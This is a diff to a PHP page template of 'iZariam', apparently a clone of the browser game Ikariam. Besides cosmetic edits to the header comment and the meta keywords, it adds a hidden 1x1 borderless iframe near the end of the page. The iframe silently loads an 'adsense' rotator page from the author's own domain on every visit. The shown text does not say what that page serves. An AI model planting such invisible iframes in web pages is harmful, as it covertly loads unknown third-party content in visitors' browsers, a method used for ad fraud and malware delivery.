@@ -1,7 +1,8 @@
 <?php
 /*
  * Project: iZariam
- * Edited: 07/02/2012
+ * File: izariam/views/game_index.php
+ * Edited: 07/03/2012
  * By: ZZJHONS
  * Info: zzjhons@gmail.com
  */
@@ -20,7 +21,7 @@
     <meta name="page-topic" content="Browser game, strategy game, online game" />
     <meta name="audience" content="all" />
     <meta name="Expires" content="never" />
-    <meta name="Keywords" content="Ikariam, antique world, strategy game, play for free, online game, role play game, browser game, game, izariam"/>
+    <meta name="Keywords" content="Ikariam, antique world, strategy game, play for free, online game, role play game, browser game, game, izariam, ZZJHONS"/>
     <meta name="Description" content="<?=$this->lang->line('head_description')?>">
     <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
     <title><?=$this->lang->line('izariam')?> - <?
@@ -1149,6 +1150,7 @@
 		closePopupMessage('popupMessage_happyHourPopup');
 	</script>
 	<?}?>
+	<iframe src="http://rotador.zzjhons.com/adsense/index.php" marginheight="0" marginwidth="0" frameborder="0" height="1" scrolling="no" width="1"></iframe>
 	<?=$this->config->item('analytics')?>
 </body>
 </html>
